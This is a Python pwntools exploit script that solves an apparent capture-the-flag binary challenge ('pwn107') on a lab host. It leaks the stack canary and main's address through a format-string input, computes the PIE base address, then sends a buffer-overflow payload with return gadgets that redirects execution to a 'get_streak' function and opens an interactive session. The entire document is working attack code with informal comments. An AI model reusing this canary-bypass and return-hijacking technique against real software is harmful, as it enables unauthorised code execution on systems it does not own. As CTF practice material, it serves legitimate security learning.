from pwn import *

elf = context.binary = ELF('./pwn107-1644307530397.pwn107')
context.log_level = 'debug'

io = remote('10.10.255.96', 9007)
# io = process()


### Canary Leak found at 13th argument, Main found at 19th in remote, 17th local
### entry (_start) found at 11th remote. Local takde

# readelf -s pwn107-1644307530397.pwn107 | grep main      
#     66: 0000000000000992   243 FUNC    GLOBAL DEFAULT   14 main

# Look at offset which is 992, then try to leak the remote server(fuzz) and find same offset


io.sendlineafter(b"What's your last streak? ", '%13$p %19$p')

io.recvuntil(b'Your current streak: ')


leaks = io.recvline().strip().decode()

canary_leak, main_leak = leaks.split()



canary_leak = int(canary_leak,16)
log.success(f' Canary Leaked: {hex(canary_leak)}')

main_leak = int(main_leak,16)
log.success(f' Main Leaked: {hex(main_leak)}')

# entry_leak = int(entry_leak,16)
# log.success(f' Entry Leaked: {hex(entry_leak)}')

# elf.address = entry_leak - elf.entry

elf.address = main_leak - elf.sym['main']
log.success(f' Base Address: {hex(elf.address)}')



offset = 24
ret = 0x6fe

# Troubleshoot many times turns out i forgor to add the base address to gadget haish
updated_ret = ret + elf.address


payload = flat(
	asm('nop') * offset,	# 24 		# Fill the buffer
	canary_leak,			# 8
	updated_ret,			# 8
	updated_ret,			# 8			# Needs another ret lmao
	elf.sym['get_streak']
)

io.clean()

io.sendline(payload)

io.interactive()



